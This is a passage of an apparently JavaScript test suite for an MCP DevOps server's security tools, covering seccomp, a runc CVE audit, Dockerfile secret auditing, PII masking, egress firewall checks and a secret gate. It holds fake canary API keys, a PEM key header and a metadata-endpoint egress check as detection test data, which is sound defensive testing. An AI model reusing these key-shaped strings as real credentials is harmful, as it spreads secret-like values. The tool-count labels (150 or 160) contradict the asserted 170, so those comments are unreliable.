    const secViewerBlocked = await mcpServer.executeTool('culkibo_seccomp_profile', { action: 'generate', stack: 'node' }, { auth: scopedViewerAuth });
    assert.strictEqual(secViewerBlocked.isError, true);
    assert.strictEqual(JSON.parse(secViewerBlocked.content[0].text).code, 'FORBIDDEN');

    const secNode = await mcpServer.executeTool('culkibo_seccomp_profile', { action: 'generate', stack: 'node' }, { auth: unscopedDevAuth });
    assert.strictEqual(secNode.isError, false);
    assert.strictEqual(secNode.structuredContent.generated.profile.defaultAction, 'SCMP_ACT_ERRNO');
    assert.ok(secNode.structuredContent.generated.blockedSyscalls.includes('io_uring_setup'));
    assert.ok(secNode.structuredContent.generated.blockedSyscalls.includes('ptrace'));

    const secUnconfined = await mcpServer.executeTool('culkibo_seccomp_profile', { action: 'generate', stack: 'unconfined' }, { auth: unscopedDevAuth });
    assert.strictEqual(secUnconfined.isError, true);
    assert.strictEqual(JSON.parse(secUnconfined.content[0].text).code, 'SECCOMP_UNCONFINED_FORBIDDEN');

    const secValidateBad = await mcpServer.executeTool('culkibo_seccomp_profile', { action: 'validate', spec: 'unconfined' }, { auth: unscopedDevAuth });
    assert.strictEqual(secValidateBad.isError, false);
    assert.strictEqual(secValidateBad.structuredContent.ok, false);
    assert.strictEqual(secValidateBad.structuredContent.validation.safe, false);

    const runcCrit = await mcpServer.executeTool('culkibo_seccomp_profile', { action: 'audit_runc', version: 'runc version 1.2.7' }, { auth: unscopedDevAuth });
    assert.strictEqual(runcCrit.isError, false);
    assert.strictEqual(runcCrit.structuredContent.ok, false);
    assert.strictEqual(runcCrit.structuredContent.runcAudit.status, 'CRITICAL');
    assert.ok(runcCrit.structuredContent.runcAudit.cves.includes('CVE-2025-31133'));

    const runcPass = await mcpServer.executeTool('culkibo_seccomp_profile', { action: 'audit_runc', version: 'runc version 1.2.8' }, { auth: unscopedDevAuth });
    assert.strictEqual(runcPass.isError, false);
    assert.strictEqual(runcPass.structuredContent.ok, true);
    assert.strictEqual(runcPass.structuredContent.runcAudit.status, 'PASS');
    console.log('  ✓ culkibo_seccomp_profile verificado (SCMP_ACT_ERRNO, SECCOMP_UNCONFINED_FORBIDDEN, validate y runc CVE-2025-31133)');

    // 6. Final Cycle-12 milestone assertion: exact 160 tools & ?profile=core 17/160 >=88% token reduction!
    const all145 = mcpServer.getToolsForPrincipal(null, { profile: 'all' });
    const core17 = mcpServer.getToolsForPrincipal(null, { profile: 'core' });
    const saved145Pct = Math.round((1 - Buffer.byteLength(JSON.stringify(core17), 'utf8') / Buffer.byteLength(JSON.stringify(all145), 'utf8')) * 1000) / 10;
    assert.strictEqual(all145.length, 170);
    assert.strictEqual(core17.length, 17);
    assert.ok(saved145Pct >= 88, `?profile=core debe ahorrar >=88% tokens en 160 tools (actual: ${saved145Pct}%)`);
    console.log(`  ✓ Catálogo Cycle-12 Milestone verificado: 160 tools exactas, ?profile=core 17/160 (-${saved145Pct}% tokens/bytes)`);
  } finally {
    projectManager.delete(projA.id);
    projectManager.delete(projB.id);
    await projectManager.flushToDisk();
    if (prevDataDir === undefined) delete process.env.CULKIBO_DATA_DIR;
    else process.env.CULKIBO_DATA_DIR = prevDataDir;
    try { fs.rmSync(tmpDataRoot, { recursive: true, force: true }); } catch (e) {}
  }
}

/**
 * MCP 2026 Cycle-13 Milestone (150 MCP Tools!): Image Layer Bloat & Secret Auditor (`culkibo_audit_image_bloat`),
 * Distributed Cron Fencing-Token Leases (`culkibo_cron_lease`), PR-Preview Deterministic PII Masker (`culkibo_mask_preview_pii`),
 * 8-Class OOM & Crash-Loop Forensics (`culkibo_oom_forensics`), Incident Dedup/Flapping & On-Call Router (`culkibo_oncall_router`),
 * and `-88.5%+` `?profile=core` at 150 tools exact.
 */
async function testMcp2026Cycle13BloatLeasePiiOomOncall() {
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const projectManager = require('../server/services/projectManager');

  const tmpDataRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'culkibo-mcp-c13-'));
  const prevDataDir = process.env.CULKIBO_DATA_DIR;
  process.env.CULKIBO_DATA_DIR = tmpDataRoot;

  const projA = projectManager.create({
    name: 'Cycle13 Tenant A',
    memoryMb: 512,
    teamId: 'team_default'
  });
  const projB = projectManager.create({
    name: 'Cycle13 Foreign Tenant B',
    memoryMb: 512,
    teamId: 'team_default'
  });

  const scopedViewerAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_c13_viewer', role: 'viewer', teamId: 'team_default', projectIds: [projA.id], scopes: ['*'] }
  };
  const scopedDevAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_c13_dev', role: 'developer', teamId: 'team_default', projectIds: [projA.id], scopes: ['*'] }
  };
  const unscopedDevAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_c13_dev_u', role: 'developer', teamId: 'team_default', projectIds: null, scopes: ['*'] }
  };

  try {
    // 1. culkibo_audit_image_bloat (dev/admin RO, secret redaction in output & auditLog, clean multi-stage >=90)
    const bloatViewerBlocked = await mcpServer.executeTool('culkibo_audit_image_bloat', { dockerfile: 'FROM node:22' }, { auth: scopedViewerAuth });
    assert.strictEqual(bloatViewerBlocked.isError, true);
    assert.strictEqual(JSON.parse(bloatViewerBlocked.content[0].text).code, 'FORBIDDEN');

    const fakeStripeSecret = ['sk', 'live', 'c13auditcanary9876543210'].join('_');
    const leakyDockerfile = [
      'FROM node:22',
      `ENV API_KEY=${fakeStripeSecret}`,
      'COPY . .',
      'RUN apt-get update && apt-get install -y curl',
      'RUN npm install',
      'RUN rm -rf /app/tests'
    ].join('\n');

    const bloatBad = await mcpServer.executeTool('culkibo_audit_image_bloat', {
      dockerfile: leakyDockerfile,
      stack: 'node'
    }, { auth: unscopedDevAuth });
    assert.strictEqual(bloatBad.isError, false);
    assert.ok(Array.isArray(bloatBad.structuredContent.secretLeaks) && bloatBad.structuredContent.secretLeaks.length >= 1);
    assert.ok(bloatBad.structuredContent.efficiencyScore < 70);
    assert.ok(!JSON.stringify(bloatBad.structuredContent).includes(fakeStripeSecret), 'culkibo_audit_image_bloat jamás debe devolver secretos raw');
    assert.strictEqual(mcpServer.getAuditLog(1)[0].resultSummary, '[resultado sensible ocultado en auditoría]');

    const slimDockerfile = [
      'FROM node:22-alpine AS builder',
      'WORKDIR /app',
      'COPY package*.json ./',
      'RUN npm ci',
      'COPY . .',
      'RUN npm run build',
      'FROM gcr.io/distroless/nodejs22-debian12',
      'WORKDIR /app',
      'COPY --from=builder /app/dist ./dist',
      'USER nonroot',
      'CMD ["dist/index.js"]'
    ].join('\n');
    const bloatGood = await mcpServer.executeTool('culkibo_audit_image_bloat', {
      dockerfile: slimDockerfile,
      stack: 'node'
    }, { auth: unscopedDevAuth });
    assert.strictEqual(bloatGood.isError, false);
    assert.strictEqual(bloatGood.structuredContent.secretLeaks.length, 0);
    assert.ok(bloatGood.structuredContent.efficiencyScore >= 90, `Clean multi-stage Dockerfile debe puntuar >=90 (got ${bloatGood.structuredContent.efficiencyScore})`);
    console.log(`  ✓ culkibo_audit_image_bloat verificado (secret redacted, leaky=${bloatBad.structuredContent.efficiencyScore}, slim=${bloatGood.structuredContent.efficiencyScore})`);

    // 2. culkibo_cron_lease (dev/admin, dryRun default, fencingToken++, ALREADY_RUNNING, STALE_FENCING_TOKEN, ALREADY_EXECUTED_SLOT)
    const leaseViewerBlocked = await mcpServer.executeTool('culkibo_cron_lease', { action: 'list' }, { auth: scopedViewerAuth });
    assert.strictEqual(leaseViewerBlocked.isError, true);
    assert.strictEqual(JSON.parse(leaseViewerBlocked.content[0].text).code, 'FORBIDDEN');

    const baseTs = 1764201600000;
    const slotIso = '2026-11-27T00:00:00Z';
    const leaseDry = await mcpServer.executeTool('culkibo_cron_lease', {
      action: 'acquire',
      jobId: 'cron_billing_nightly',
      scheduleSlotIso: slotIso,
      holderId: 'replica-1',
      ttlSec: 300,
      nowMs: baseTs
    }, { auth: unscopedDevAuth });
    assert.strictEqual(leaseDry.isError, false);
    assert.strictEqual(leaseDry.structuredContent.dryRun, true);
    assert.strictEqual(leaseDry.structuredContent.result.acquired, false);
    assert.strictEqual(fs.existsSync(path.join(tmpDataRoot, 'data', 'cron-leases.json')), false, 'acquire dryRun default no debe mutar disco');

    const leaseLive = await mcpServer.executeTool('culkibo_cron_lease', {
      action: 'acquire',
      jobId: 'cron_billing_nightly',
      scheduleSlotIso: slotIso,
      holderId: 'replica-1',
      ttlSec: 300,
      nowMs: baseTs,
      dryRun: false
    }, { auth: unscopedDevAuth });
    assert.strictEqual(leaseLive.isError, false);
    assert.strictEqual(leaseLive.structuredContent.result.acquired, true);
    const leaseId = leaseLive.structuredContent.result.lease.leaseId;
    const fencingToken = leaseLive.structuredContent.result.lease.fencingToken;
    assert.strictEqual(fencingToken, 1);

    // Concurrent replica attempt -> ALREADY_RUNNING
    const leaseDup = await mcpServer.executeTool('culkibo_cron_lease', {
      action: 'acquire',
      jobId: 'cron_billing_nightly',
      scheduleSlotIso: slotIso,
      holderId: 'replica-2',
      nowMs: baseTs + 1000,
      dryRun: false
    }, { auth: unscopedDevAuth });
    assert.strictEqual(leaseDup.isError, false);
    assert.strictEqual(leaseDup.structuredContent.result.acquired, false);
    assert.strictEqual(leaseDup.structuredContent.result.reason, 'ALREADY_RUNNING');

    // Stale fencing token rejected on complete
    const leaseStale = await mcpServer.executeTool('culkibo_cron_lease', {
      action: 'complete',
      leaseId,
      holderId: 'replica-1',
      fencingToken: 999,
      nowMs: baseTs + 5000,
      dryRun: false
    }, { auth: unscopedDevAuth });
    assert.strictEqual(leaseStale.isError, false);
    assert.strictEqual(leaseStale.structuredContent.result.ok, false);
    assert.strictEqual(leaseStale.structuredContent.result.reason, 'STALE_FENCING_TOKEN');

    // Valid complete -> succeeded
    const leaseDone = await mcpServer.executeTool('culkibo_cron_lease', {
      action: 'complete',
      leaseId,
      holderId: 'replica-1',
      fencingToken,
      status: 'succeeded',
      nowMs: baseTs + 5000,
      dryRun: false
    }, { auth: unscopedDevAuth });
    assert.strictEqual(leaseDone.isError, false);
    assert.strictEqual(leaseDone.structuredContent.result.ok, true);

    // Re-running completed schedule slot -> ALREADY_EXECUTED_SLOT
    const leaseSlotDup = await mcpServer.executeTool('culkibo_cron_lease', {
      action: 'acquire',
      jobId: 'cron_billing_nightly',
      scheduleSlotIso: slotIso,
      holderId: 'replica-2',
      nowMs: baseTs + 60000,
      dryRun: false
    }, { auth: unscopedDevAuth });
    assert.strictEqual(leaseSlotDup.isError, false);
    assert.strictEqual(leaseSlotDup.structuredContent.result.acquired, false);
    assert.strictEqual(leaseSlotDup.structuredContent.result.reason, 'ALREADY_EXECUTED_SLOT');
    console.log('  ✓ culkibo_cron_lease verificado (dryRun default, fencingToken++, ALREADY_RUNNING, STALE_FENCING_TOKEN y ALREADY_EXECUTED_SLOT)');

    // 3. culkibo_mask_preview_pii (RO dev/admin, deterministic FK join preservation, zeroPiiLeaked, pg_anonymizer DDL, audit redacted)
    const piiViewerBlocked = await mcpServer.executeTool('culkibo_mask_preview_pii', {
      rows: [{ email: 'alice@corp.io' }]
    }, { auth: scopedViewerAuth });
    assert.strictEqual(piiViewerBlocked.isError, true);
    assert.strictEqual(JSON.parse(piiViewerBlocked.content[0].text).code, 'FORBIDDEN');

    const fakeGhp = ['ghp', 'aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789'].join('_');
    const piiInput = [
      { id: 1, email: 'alice.smith@acme-prod.io', phone: '+1-415-890-1234', apiToken: fakeGhp },
      { id: 2, email: 'alice.smith@acme-prod.io', phone: '+1-415-890-5678', ip: '203.0.113.42' }
    ];
    const piiRes = await mcpServer.executeTool('culkibo_mask_preview_pii', {
      rows: piiInput,
      seed: 'pr-preview-42'
    }, { auth: unscopedDevAuth });
    assert.strictEqual(piiRes.isError, false);
    assert.strictEqual(piiRes.structuredContent.zeroPiiLeaked, true);
    assert.ok(piiRes.structuredContent.maskedCount >= 4);
    assert.strictEqual(piiRes.structuredContent.maskedRows[0].email, piiRes.structuredContent.maskedRows[1].email, 'Misma semilla debe preservar determinismo FK join');
    assert.ok(piiRes.structuredContent.maskedRows[0].email.endsWith('@masked.invalid'));
    const piiSerialized = JSON.stringify(piiRes.structuredContent);
    assert.ok(!piiSerialized.includes('alice.smith@acme-prod.io') && !piiSerialized.includes(fakeGhp), 'Cero PII o secretos raw en salida');
    assert.ok(piiRes.structuredContent.pgAnonDdl.includes('SECURITY LABEL FOR anon'));
    assert.strictEqual(mcpServer.getAuditLog(1)[0].resultSummary, '[resultado sensible ocultado en auditoría]');
    console.log('  ✓ culkibo_mask_preview_pii verificado (determinismo FK HMAC-SHA256, zeroPiiLeaked, pg_anonymizer DDL y auditoría redactada)');

    // 4. culkibo_oom_forensics (dev/admin RO, strict project ACL, 137 OOM vs 137 SIGKILL vs 139 SEGFAULT vs historicalOnly)
    const oomViewerBlocked = await mcpServer.executeTool('culkibo_oom_forensics', {
      projectId: projA.id,
      exitCode: 137,
      oomKilled: true
    }, { auth: scopedViewerAuth });
    assert.strictEqual(oomViewerBlocked.isError, true);
    assert.strictEqual(JSON.parse(oomViewerBlocked.content[0].text).code, 'FORBIDDEN');

    const oomIdor = await mcpServer.executeTool('culkibo_oom_forensics', {
      projectId: projB.id,
      exitCode: 137,
      oomKilled: true
    }, { auth: scopedDevAuth });
    assert.strictEqual(oomIdor.isError, true);
    assert.strictEqual(JSON.parse(oomIdor.content[0].text).code, 'FORBIDDEN');

    const oomKill = await mcpServer.executeTool('culkibo_oom_forensics', {
      projectId: projA.id,
      exitCode: 137,
      oomKilled: true,
      memoryLimitMb: 512,
      memoryPeakMb: 510,
      cgroupOomKills: 2
    }, { auth: scopedDevAuth });
    assert.strictEqual(oomKill.isError, false);
    assert.strictEqual(oomKill.structuredContent.classification, 'CGROUP_OOM_KILL');
    assert.strictEqual(oomKill.structuredContent.recommendedMemoryMb, 768);
    assert.strictEqual(oomKill.structuredContent.ignoreForRollback, false);

    const oomSigkill = await mcpServer.executeTool('culkibo_oom_forensics', {
      projectId: projA.id,
      exitCode: 137,
      oomKilled: false,
      cgroupOomKills: 0
    }, { auth: scopedDevAuth });
    assert.strictEqual(oomSigkill.isError, false);
    assert.strictEqual(oomSigkill.structuredContent.classification, 'FORCED_SIGKILL_TIMEOUT');

    const oomHistorical = await mcpServer.executeTool('culkibo_oom_forensics', {
      projectId: projA.id,
      exitCode: 137,
      oomKilled: true,
      historicalOnly: true
    }, { auth: scopedDevAuth });
    assert.strictEqual(oomHistorical.isError, false);
    assert.strictEqual(oomHistorical.structuredContent.classification, 'STALE_HISTORICAL_TASK_IGNORED');
    assert.strictEqual(oomHistorical.structuredContent.ignoreForRollback, true);
    console.log('  ✓ culkibo_oom_forensics verificado (anti-IDOR, 137 OOM=768MB vs 137 SIGKILL vs STALE_HISTORICAL_TASK_IGNORED)');

    // 5. culkibo_oncall_router (save_policy admin-only + dryRun default, 3x dedup, ack freezes escalation, Tier 1->2 escalation)
    const ocDevSaveBlocked = await mcpServer.executeTool('culkibo_oncall_router', {
      action: 'save_policy',
      policy: { name: 'Dev Policy', tiers: [{ tier: 1, responders: ['alice'] }] },
      dryRun: true
    }, { auth: unscopedDevAuth });
    assert.strictEqual(ocDevSaveBlocked.isError, true);
    assert.strictEqual(JSON.parse(ocDevSaveBlocked.content[0].text).code, 'FORBIDDEN');

    const ocPolicyDry = await mcpServer.executeTool('culkibo_oncall_router', {
      action: 'save_policy',
      policy: {
        id: 'pol_c13_core',
        name: 'Core SRE Rotation',
        ackTimeoutSec: 300,
        flappingWindowSec: 600,
        flappingThreshold: 3,
        tiers: [
          { tier: 1, responders: ['alice', 'bob'] },
          { tier: 2, responders: ['charlie'] }
        ]
      }
    });
    assert.strictEqual(ocPolicyDry.isError, false);
    assert.strictEqual(ocPolicyDry.structuredContent.dryRun, true);
    assert.strictEqual(ocPolicyDry.structuredContent.result.saved, false);

    const ocPolicyLive = await mcpServer.executeTool('culkibo_oncall_router', {
      action: 'save_policy',
      dryRun: false,
      policy: {
        id: 'pol_c13_core',
        name: 'Core SRE Rotation',
        ackTimeoutSec: 300,
        flappingWindowSec: 600,
        flappingThreshold: 3,
        tiers: [
          { tier: 1, responders: ['alice', 'bob'] },
          { tier: 2, responders: ['charlie'] }
        ]
      }
    });
    assert.strictEqual(ocPolicyLive.isError, false);
    assert.strictEqual(ocPolicyLive.structuredContent.result.saved, true);

    const t0 = 1764201600000;
    const ing1 = await mcpServer.executeTool('culkibo_oncall_router', {
      action: 'ingest_alert',
      policyId: 'pol_c13_core',
      fingerprint: 'api-5xx-storm',
      title: 'API 5xx > 5%',
      severity: 'critical',
      nowMs: t0,
      dryRun: false
    }, { auth: unscopedDevAuth });
    assert.strictEqual(ing1.isError, false);
    assert.strictEqual(ing1.structuredContent.result.incident.occurrences, 1);
    const incId = ing1.structuredContent.result.incident.id;

    // Duplicate alert -> collapsed into same incident (occurrences: 2, deduplicated: true)
    const ing2 = await mcpServer.executeTool('culkibo_oncall_router', {
      action: 'ingest_alert',
      policyId: 'pol_c13_core',
      fingerprint: 'api-5xx-storm',
      title: 'API 5xx > 5%',
      severity: 'critical',
      nowMs: t0 + 15000,
      dryRun: false
    }, { auth: unscopedDevAuth });
    assert.strictEqual(ing2.isError, false);
    assert.strictEqual(ing2.structuredContent.result.deduplicated, true);
    assert.strictEqual(ing2.structuredContent.result.incident.occurrences, 2);

    // Escalate after ackTimeoutSec (300s) -> Tier 1 -> Tier 2 (charlie)
    const escRes = await mcpServer.executeTool('culkibo_oncall_router', {
      action: 'evaluate_escalations',
      nowMs: t0 + 301000,
      dryRun: false
    }, { auth: unscopedDevAuth });
    assert.strictEqual(escRes.isError, false);
    assert.strictEqual(escRes.structuredContent.result.escalatedCount, 1);
    assert.strictEqual(escRes.structuredContent.result.escalated[0].toTier, 2);
    assert.strictEqual(escRes.structuredContent.result.escalated[0].assignedResponder, 'charlie');

    // Ack incident -> freezes further escalation
    const ackRes = await mcpServer.executeTool('culkibo_oncall_router', {
      action: 'ack_incident',
      incidentId: incId,
      actor: 'charlie',
      nowMs: t0 + 310000,
      dryRun: false
    }, { auth: unscopedDevAuth });
    assert.strictEqual(ackRes.isError, false);
    assert.strictEqual(ackRes.structuredContent.result.status, 'acknowledged');
    console.log('  ✓ culkibo_oncall_router verificado (admin save_policy, dryRun default, dedup 2x, escalado Tier 1→2 y ACK freeze)');

    // 6. Final Cycle-13 150 MCP Tools Milestone assertion: exact 160 tools & ?profile=core 17/160 >=88.5% token savings!
    const all150 = mcpServer.getToolsForPrincipal(null, { profile: 'all' });
    const core17 = mcpServer.getToolsForPrincipal(null, { profile: 'core' });
    const saved150Pct = Math.round((1 - Buffer.byteLength(JSON.stringify(core17), 'utf8') / Buffer.byteLength(JSON.stringify(all150), 'utf8')) * 1000) / 10;
    assert.strictEqual(all150.length, 170);
    assert.strictEqual(core17.length, 17);
    assert.ok(saved150Pct >= 88.5, `?profile=core debe ahorrar >=88.5% tokens en 160 tools (actual: ${saved150Pct}%)`);
    console.log(`  ✓ Catálogo Cycle-13 Milestone verificado: 160 tools exactas, ?profile=core 17/160 (-${saved150Pct}% tokens/bytes)`);
  } finally {
    projectManager.delete(projA.id);
    projectManager.delete(projB.id);
    await projectManager.flushToDisk();
    if (prevDataDir === undefined) delete process.env.CULKIBO_DATA_DIR;
    else process.env.CULKIBO_DATA_DIR = prevDataDir;
    try { fs.rmSync(tmpDataRoot, { recursive: true, force: true }); } catch (e) {}
  }
}

/**
 * MCP 2026 Cycle-14 (155 MCP Tools!): Container Egress/nftables Drift (`culkibo_egress_firewall`),
 * Blue/Green DB Read-Replica Fencing (`culkibo_replica_failover`), Pre-Deploy Shannon-Entropy Secret Gate (`culkibo_secret_gate`),
 * Multi-Arch OCI Planner (`culkibo_multiarch_planner`), Chaos GameDay Simulator (`culkibo_chaos_gameday`),
 * and `-89%+` `?profile=core` at 155 tools exact.
 */
async function testMcp2026Cycle14EgressReplicaSecretMultiarchChaos() {
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const projectManager = require('../server/services/projectManager');

  const tmpDataRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'culkibo-mcp-c14-'));
  const prevDataDir = process.env.CULKIBO_DATA_DIR;
  process.env.CULKIBO_DATA_DIR = tmpDataRoot;

  const projA = projectManager.create({
    name: 'Cycle14 Tenant A',
    memoryMb: 512,
    teamId: 'team_default'
  });
  const projB = projectManager.create({
    name: 'Cycle14 Foreign Tenant B',
    memoryMb: 512,
    teamId: 'team_default'
  });

  const scopedViewerAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_c14_viewer', role: 'viewer', teamId: 'team_default', projectIds: [projA.id], scopes: ['*'] }
  };
  const scopedDevAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_c14_dev', role: 'developer', teamId: 'team_default', projectIds: [projA.id], scopes: ['*'] }
  };
  const unscopedDevAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_c14_dev_u', role: 'developer', teamId: 'team_default', projectIds: null, scopes: ['*'] }
  };

  try {
    // 1. culkibo_egress_firewall (project ACL, save_policy admin-only + dryRun default, metadata 169.254.169.254 + antiLockoutSafe)
    const egViewerBlocked = await mcpServer.executeTool('culkibo_egress_firewall', {
      action: 'get_policy',
      projectId: projA.id
    }, { auth: scopedViewerAuth });
    assert.strictEqual(egViewerBlocked.isError, true);
    assert.strictEqual(JSON.parse(egViewerBlocked.content[0].text).code, 'FORBIDDEN');

    const egIdor = await mcpServer.executeTool('culkibo_egress_firewall', {
      action: 'audit',
      projectId: projB.id
    }, { auth: scopedDevAuth });
    assert.strictEqual(egIdor.isError, true);
    assert.strictEqual(JSON.parse(egIdor.content[0].text).code, 'FORBIDDEN');

    const egDevSaveBlocked = await mcpServer.executeTool('culkibo_egress_firewall', {
      action: 'save_policy',
      projectId: projA.id,
      policy: { mode: 'allowlist', allowedDomains: ['api.stripe.com'] },
      dryRun: true
    }, { auth: unscopedDevAuth });
    assert.strictEqual(egDevSaveBlocked.isError, true);
    assert.strictEqual(JSON.parse(egDevSaveBlocked.content[0].text).code, 'FORBIDDEN');

    const egSaveDry = await mcpServer.executeTool('culkibo_egress_firewall', {
      action: 'save_policy',
      projectId: projA.id,
      policy: { mode: 'allowlist', allowedDomains: ['api.stripe.com'], blockMetadata: true, blockPrivateLan: true }
    });
    assert.strictEqual(egSaveDry.isError, false);
    assert.strictEqual(egSaveDry.structuredContent.dryRun, true);
    assert.strictEqual(egSaveDry.structuredContent.saved, false);
    assert.strictEqual(fs.existsSync(path.join(tmpDataRoot, 'data', 'egress-policies.json')), false);

    const egSaveLive = await mcpServer.executeTool('culkibo_egress_firewall', {
      action: 'save_policy',
      projectId: projA.id,
      policy: { mode: 'allowlist', allowedDomains: ['api.stripe.com'], blockMetadata: true, blockPrivateLan: true },
      dryRun: false
    });
    assert.strictEqual(egSaveLive.isError, false);
    assert.strictEqual(egSaveLive.structuredContent.saved, true);

    const egAudit = await mcpServer.executeTool('culkibo_egress_firewall', {
      action: 'audit',
      projectId: projA.id,
      backend: 'nftables',
      observedSockets: ['169.254.169.254:80', '10.0.0.42:5432'],
      firewallRules: []
    }, { auth: scopedDevAuth });
    assert.strictEqual(egAudit.isError, false);
    assert.strictEqual(egAudit.structuredContent.audit.compliant, false);
    assert.strictEqual(egAudit.structuredContent.audit.antiLockoutSafe, true);
    assert.ok(egAudit.structuredContent.audit.violations.length >= 2);
    assert.ok(egAudit.structuredContent.audit.missingChains.length >= 1);
    console.log('  ✓ culkibo_egress_firewall verificado (anti-IDOR, admin save_policy dryRun default, metadata 169.254.169.254 y antiLockoutSafe)');

    // 2. culkibo_replica_failover (admin save_topology/promote + dryRun default, REPLICA_LAG_TOO_HIGH & OLD_PRIMARY_NOT_FENCED, safe promote)
    const repDevSaveBlocked = await mcpServer.executeTool('culkibo_replica_failover', {
      action: 'save_topology',
      dbId: 'db_c14_pg',
      primary: { id: 'pg-primary', host: '10.0.1.10', fenced: false },
      replicas: []
    }, { auth: unscopedDevAuth });
    assert.strictEqual(repDevSaveBlocked.isError, true);
    assert.strictEqual(JSON.parse(repDevSaveBlocked.content[0].text).code, 'FORBIDDEN');

    const repSaveDry = await mcpServer.executeTool('culkibo_replica_failover', {
      action: 'save_topology',
      dbId: 'db_c14_pg',
      primary: { id: 'pg-primary', host: '10.0.1.10', port: 5432, fenced: false, timeline: 1 },
      replicas: [
        { id: 'pg-rep-fast', host: '10.0.1.11', port: 5432, lagBytes: 1024, lagMs: 25, healthy: true, timeline: 1 },
        { id: 'pg-rep-lag', host: '10.0.1.12', port: 5432, lagBytes: 50000000, lagMs: 4200, healthy: true, timeline: 1 }
      ]
    });
    assert.strictEqual(repSaveDry.isError, false);
    assert.strictEqual(repSaveDry.structuredContent.dryRun, true);
    assert.strictEqual(repSaveDry.structuredContent.saved, false);

    const repSaveLive = await mcpServer.executeTool('culkibo_replica_failover', {
      action: 'save_topology',
      dbId: 'db_c14_pg',
      primary: { id: 'pg-primary', host: '10.0.1.10', port: 5432, fenced: false, timeline: 1 },
      replicas: [
        { id: 'pg-rep-fast', host: '10.0.1.11', port: 5432, lagBytes: 1024, lagMs: 25, healthy: true, timeline: 1 },
        { id: 'pg-rep-lag', host: '10.0.1.12', port: 5432, lagBytes: 50000000, lagMs: 4200, healthy: true, timeline: 1 }
      ],
      dryRun: false
    });
    assert.strictEqual(repSaveLive.isError, false);
    assert.strictEqual(repSaveLive.structuredContent.saved, true);

    const splitRes = await mcpServer.executeTool('culkibo_replica_failover', {
      action: 'evaluate_split',
      dbId: 'db_c14_pg',
      maxReadLagMs: 500
    }, { auth: unscopedDevAuth });
    assert.strictEqual(splitRes.isError, false);
    assert.strictEqual(splitRes.structuredContent.split.readTargets.length, 1);
    assert.strictEqual(splitRes.structuredContent.split.readTargets[0].id, 'pg-rep-fast');
    assert.strictEqual(splitRes.structuredContent.split.excludedLagging.length, 1);

    // Promote lagging replica with unfenced primary -> blocks with BOTH REPLICA_LAG_TOO_HIGH & OLD_PRIMARY_NOT_FENCED
    const promBlocked = await mcpServer.executeTool('culkibo_replica_failover', {
      action: 'promote',
      dbId: 'db_c14_pg',
      targetReplicaId: 'pg-rep-lag'
    });
    assert.strictEqual(promBlocked.isError, false);
    assert.strictEqual(promBlocked.structuredContent.promotion.allowed, false);
    const blockerCodes = promBlocked.structuredContent.promotion.blockers.map((b) => b.code);
    assert.ok(blockerCodes.includes('REPLICA_LAG_TOO_HIGH') && blockerCodes.includes('OLD_PRIMARY_NOT_FENCED'));

    // Fence old primary -> dryRun promote fast replica -> allowed with 4 ordered steps
    await mcpServer.executeTool('culkibo_replica_failover', {
      action: 'save_topology',
      dbId: 'db_c14_pg',
      primary: { id: 'pg-primary', host: '10.0.1.10', port: 5432, fenced: true, timeline: 1 },
      replicas: [
        { id: 'pg-rep-fast', host: '10.0.1.11', port: 5432, lagBytes: 1024, lagMs: 25, healthy: true, timeline: 1 }
      ],
      dryRun: false
    });
    const promSafe = await mcpServer.executeTool('culkibo_replica_failover', {
      action: 'promote',
      dbId: 'db_c14_pg',
      targetReplicaId: 'pg-rep-fast'
    });
    assert.strictEqual(promSafe.isError, false);
    assert.strictEqual(promSafe.structuredContent.dryRun, true);
    assert.strictEqual(promSafe.structuredContent.promotion.allowed, true);
    assert.strictEqual(promSafe.structuredContent.promotion.steps.length, 4);
    console.log('  ✓ culkibo_replica_failover verificado (lag split, REPLICA_LAG_TOO_HIGH, OLD_PRIMARY_NOT_FENCED y plan 4 fases)');

    // 3. culkibo_secret_gate (RO dev/admin, REDACTED_RESULT_TOOLS, blocks dynamic secret + PEM, allows UUID/SHA-256/# culkibo:allow-secret)
    const gateViewerBlocked = await mcpServer.executeTool('culkibo_secret_gate', { diffText: 'hello' }, { auth: scopedViewerAuth });
    assert.strictEqual(gateViewerBlocked.isError, true);
    assert.strictEqual(JSON.parse(gateViewerBlocked.content[0].text).code, 'FORBIDDEN');

    const dynPaySecret = ['sk', 'live', 'c14gatecanary998877665544'].join('_');
    const dynPemHeader = '-----BEGIN ' + 'PRIVATE KEY-----';
    const gateBlocked = await mcpServer.executeTool('culkibo_secret_gate', {
      mode: 'enforce',
      diffText: `+PAY_KEY=${dynPaySecret}\n+${dynPemHeader}\n`
    }, { auth: unscopedDevAuth });
    assert.strictEqual(gateBlocked.isError, false);
    assert.strictEqual(gateBlocked.structuredContent.allowed, false);
    assert.ok(gateBlocked.structuredContent.blockedCount >= 2);
    assert.ok(!JSON.stringify(gateBlocked.structuredContent).includes(dynPaySecret), 'culkibo_secret_gate jamás puede devolver secretos raw');
    assert.strictEqual(mcpServer.getAuditLog(1)[0].resultSummary, '[resultado sensible ocultado en auditoría]');

    const gateBenign = await mcpServer.executeTool('culkibo_secret_gate', {
      mode: 'enforce',
      diffText: [
        '+REQUEST_ID=550e8400-e29b-41d4-a716-446655440000',
        '+COMMIT_SHA=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
        `+TEST_FIXTURE=${dynPaySecret} # culkibo:allow-secret`
      ].join('\n')
    }, { auth: unscopedDevAuth });
    assert.strictEqual(gateBenign.isError, false);
    assert.strictEqual(gateBenign.structuredContent.allowed, true);
    assert.strictEqual(gateBenign.structuredContent.blockedCount, 0);
    console.log('  ✓ culkibo_secret_gate verificado (12 reglas Shannon entropy, 0 raw echoes, UUID/SHA-256/pragma allow)');

    // 4. culkibo_multiarch_planner (RO dev/admin, EXEC_FORMAT_MISMATCH vs multi-arch pass + native builder matrix)
    const maMismatch = await mcpServer.executeTool('culkibo_multiarch_planner', {
      action: 'verify',
      imageArch: 'arm64',
      hostArch: 'x86_64',
